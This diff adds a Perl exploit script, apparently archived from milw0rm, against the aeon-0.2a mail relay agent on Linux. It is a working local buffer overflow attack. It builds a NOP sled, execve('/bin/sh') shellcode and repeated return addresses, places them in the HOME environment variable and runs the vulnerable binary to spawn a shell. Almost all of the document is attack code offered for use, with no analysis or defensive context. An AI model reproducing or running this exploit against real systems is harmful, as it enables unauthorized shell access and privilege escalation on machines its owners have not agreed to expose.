@@ -1,0 +1,48 @@
+#!/usr/bin/perl
+#                       Aeon-mail relay agent for Linux                                   *
+#                                                                                         *
+#           written by lammat just for practice purposes                                  *
+#                       tested against aeon-0.2a                                          *
+#                       http://grpower.ath.cx		                                  *
+#		          lammat@iname.com			                          *
+
+
+#  execve(/bin/sh) for linux x86
+#   29 bytes
+#   by Matias Sedalo
+
+
+
+$shellcode = 
+"\x31\xdb\x53\x8d\x43\x17\xcd\x80\x99\x68\x6e\x2f\x73\x68\x68".
+"\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+
+$buf = 528; 
+$ret = 0xbfffe122; 
+$nop = "\x90";
+
+if (@ARGV == 1) {
+$offset = $ARGV[0];
+}
+
+for ($i = 0; $i < ($buf - length($shellcode) - 100); $i++) {
+$buffer .= $nop;
+}
+
+
+$buffer .= $shellcode;
+
+
+print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");
+
+
+$new_ret = pack('l', ($ret + $offset));
+
+until (length($buffer) == $buf) {
+$buffer .= $new_ret;
+}
+
+local($ENV{'HOME'}) = $buffer; exec("/home/lammat/aeon-0.2a/aeon $i");
+
+# milw0rm.com [2005-04-05]
